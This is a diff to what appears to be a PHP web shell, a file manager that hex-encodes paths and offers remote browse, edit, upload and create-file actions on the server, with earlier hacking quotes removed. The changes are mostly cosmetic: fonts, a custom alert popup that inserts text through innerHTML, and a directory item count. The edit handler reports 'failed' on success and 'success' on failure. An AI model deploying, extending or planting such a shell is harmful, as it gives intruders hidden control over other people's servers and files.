@@ -1,12 +1,12 @@
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <style type="text/css">
-	@import url('https://fonts.googleapis.com/css2?family=MuseoModerno&display=swap');
+	@import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600&display=swap');
 	:root {
 		--color-bg:#f2f2f2;
 	}
 	body {
-		font-family: 'MuseoModerno', cursive;
+		font-family: 'Titillium Web', sans-serif;
 		overflow: hidden;
 		margin:10px;
 	}
@@ -79,7 +79,7 @@
 		border-radius:4px;
 		border: 1px solid #e6e6e6;
 		outline: none;
-		font-family: 'MuseoModerno', cursive;
+		font-family: 'Titillium Web', sans-serif;
 		width:100%;
 	}
 	div.edit, div.createfile, div.chname {
@@ -99,7 +99,7 @@
 		font-size:25px;
 	}
 	input[type=submit] {
-		font-family: 'MuseoModerno', cursive;
+		font-family: 'Titillium Web', sans-serif;
 		width:100%;
 		border-radius:5px;
 		background:#f2f2f2;
@@ -107,7 +107,7 @@
 		padding:7px;
 	}
 	input[type=text] {
-		font-family: 'MuseoModerno', cursive;
+		font-family: 'Titillium Web', sans-serif;
 		width:100%;
 		outline: none;
 		border-radius:5px;
@@ -118,10 +118,6 @@
 		margin-top:5px;
         width:24px;
         height:24px;
-    }
-    div.quotes {
-    	border-left: 1px solid #e6e6e6;
-    	border-right: 1px solid #e6e6e6;
     }
 	.filename, .textarea, .submit {
 		padding:3px;
@@ -154,37 +150,69 @@
 	textarea::-ms-input-placeholder {
   		color: red;
 	}
-	.marquee {
-  		height: 25px;
-  		width: 100%;
-  		overflow: hidden;
- 		position: relative;
-	}
-	.marquee div {
-		text-align: center;
-  		display: block;
-  		width: 100%;
-  		height: 30px;
-  		position: absolute;
-  		overflow: hidden;
-	}
 	.second {
 		display: none;
 	}
-	.marquee span {
-  		width: 50%;
+	#modalContainer {
+		background-color:rgba(0, 0, 0, 0.3);
+		position:absolute;
+		width:100%;
+		height:100%;
+		top:0px;
+		left:0px;
+		z-index:10000;
 	}
-	@keyframes marquee {
-		0% {
-			left: 0; 
-		}
-		100% { 
-			left: -100%; 
-		}
+
+	#alertBox {
+		position:relative;
+		width:300px;
+		min-height:165px;
+		padding:10px;
+		border-radius:10px;
+		margin-top:50px;
+		background-color:#fff;
+		background-repeat:no-repeat;
+		background-position:20px 30px;
+	}
+
+	#modalContainer > #alertBox {
+		position:fixed;
+	}
+
+	#alertBox h1 {
+		margin:0;
+		font-family: 'Titillium Web', sans-serif;
+		color:#000;
+		border-bottom: 1px solid rgba(222,222,222,0.73);
+		border-radius: 10px 10px 00px 0px;
+		padding:10px 0 10px 15px;
+	}
+
+	#alertBox p {
+		font-family: 'Titillium Web', sans-serif;
+		height:50px;
+		margin-left:16px;
+	}
+
+	#alertBox #closeBtn {
+		display:block;
+		position:relative;
+		margin:5px auto;
+		outline:none;
+		padding:7px 100px;
+		border-radius:7px;
+		width:70px;
+		font-family: 'Titillium Web', sans-serif;
+		text-transform:uppercase;
+		text-align:center;
+		color: #8a8a8a;
+		background-color:rgba(222,222,222,0.73);
+		text-decoration:none;
 	}
 	@media (min-width: 320px) and (max-width: 480px) {
 		body {
 			margin:0;
+			overflow: hidden;
 		}
 		* {
 			font-size: 12px;
@@ -219,6 +247,42 @@
 		}
 	}
 </style>
+<script type='text/javascript'>
+	var alert_TITLE = "Alert";
+	var alert_BUTTON_TEXT = "Ok";
+
+	if(document.getElementById) {
+		window.alert = function(txt) {
+			createCustomalert(txt);
+		}
+	}
+	function createCustomalert(txt) {
+		d = document;
+		if(d.getElementById("modalContainer")) return;
+		mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+		mObj.id = "modalContainer";
+		mObj.style.height = d.documentElement.scrollHeight + "px";
+		alertObj = mObj.appendChild(d.createElement("div"));
+		alertObj.id = "alertBox";
+		if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+		alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
+		alertObj.style.visiblity="visible";
+		h1 = alertObj.appendChild(d.createElement("h1"));
+		h1.appendChild(d.createTextNode(alert_TITLE));
+		msg = alertObj.appendChild(d.createElement("p"));
+		msg.innerHTML = txt;
+		btn = alertObj.appendChild(d.createElement("a"));
+		btn.id = "closeBtn";
+		btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
+		btn.href = "#";
+		btn.focus();
+		btn.onclick = function() { removeCustomalert();return false; }
+		alertObj.style.display = "block";
+	}
+	function removeCustomalert() {
+		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+	}
+</script>
 <center>
 <div class="container">
 	<div class="row">
@@ -253,7 +317,7 @@
 						break;
 				}
 				$file['link']	= self::hex($file['name']);
-				$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
+				$file['size'] 	= (is_dir($file['name'])) ? self::countDir($file['name']). " items" : x::size($file['name']);
 				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
 				$result[] = $file;
 			} return $result;
@@ -312,6 +376,9 @@
     				return false;
     			}
     		}
+    	}
+    	public static function countDir($filename) {
+    		return count(scandir($filename)) -2;
     	}
     	public static function getimg($filename) {
         	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
@@ -374,26 +441,6 @@
                 	break;
         	}
     	}
-    	public static function quotes(){
-    		$quotes = array(
-    			"<font size='2'>&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;</font>  <font size='1' color='gray'>Anthony J. D'Angelo</font>",
-    			"<font size='2'>&quot;The difference between stupidity and genius is that genius has its limits&quot;</font>  <font size='1' color='gray'>Albert Einstein</font>",
-    			"<font size='2'>&quot;As a young boy, I was taught in high school that hacking was cool.&quot;</font>  <font size='1' color='gray'>Kevin Mitnick</font>",
-    			"<font size='2'>&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;</font>  <font size='1' color='gray'>Steve Wozniak</font>",
-    			"<font size='2'>&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
-    			"<font size='2'>&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
-    			"<font size='2'>&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;</font>  <font size='1' color='gray'>Cory Doctorow</font>",
-    			"<font size='2'>&quot;It? hardware that makes a machine fast. It? software that makes a fast machine slow.&quot;</font>  <font size='1' color='gray'>Craig Bruce</font>",
-    			"<font size='2'>&quot;The function of good software is to make the complex appear to be simple.&quot;</font>  <font size='1' color='gray'>Grady Booch</font>",
-    			"<font size='2'>&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
-    			"<font size='2'>&quot;Tell me what you need and I'll tell you how to get along without it.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
-    			"<font size='2'>&quot;Hmm..&quot;</font> <font size='1' color='gray'>Smash</font>",
-    			"<font size='2'>&quot;Once we accept our limits, we go beyond them.&quot;</font> <font size='1' color='gray'>Albert Einstein</font>",
-    			"<font size='2'>&quot;Listen to many, speak to a few.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>",
-    			"<font size='2'>&quot;The robbed that smiles, steals something from the thief.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>");
-    		$quote = $quotes[array_rand($quotes)];
-    		return $quote;
-		}
     	public static function hex($string){
     		$hex = '';
     		for ($i=0; $i < strlen($string); $i++) {
@@ -431,20 +478,12 @@
             	while ($total-- && $filesize > 1024) {
                 	$filesize /= 1024;
             	} return round($filesize, 2) . " " . $array[$total];
-        	} return false;
+        	}
     	}
 	}
 	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
 	?>
 	<div class="row">
-		<div class="col-xs-12 quotes">
-			<div class="marquee">
-				<div>
-					<span><?= x::quotes() ?></span>
-					<span class="second"><?= x::quotes() ?></span>
-				</div>
-			</div>
-		</div>
 		<div class="col-xs-2 tool">
 			<a href="#">
 				<img src="https://image.flaticon.com/icons/svg/785/785822.svg" class="icons">
@@ -458,7 +497,7 @@
 				<img src="https://image.flaticon.com/icons/svg/892/892311.svg" class="icons">
 				<span>Upload</span>
 			</a>
-			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=<?= x::hex("createfile") ?>">
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=createfile">
 				<img src="https://image.flaticon.com/icons/svg/2921/2921226.svg" class="icons">
 				<span>Add File</span>
 			</a>
@@ -590,9 +629,9 @@
 				case 'edit':
 					if (isset($_POST['edit'])) {
 						if (x::save($_POST['file'], $_POST['data'], 'save', 'w')) {
-							print("failed");
+							print("<script>alert('failed')</script>");
 						} else {
-							print("success");
+							print("<script>alert('success')</script>");
 						}
 					}
 					?>
@@ -656,7 +695,11 @@
 				if (isset($_GET['cd'])) {
 					x::cd(x::unhex($_GET['cd']));
 				}
-				?> <table width="100%"> <?php
+				?><table width="100%">
+					<tr>
+						<td colspan="5">cwd</td>
+					</tr>
+				<?php
 				foreach (x::files('dir') as $key => $dir) { ?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
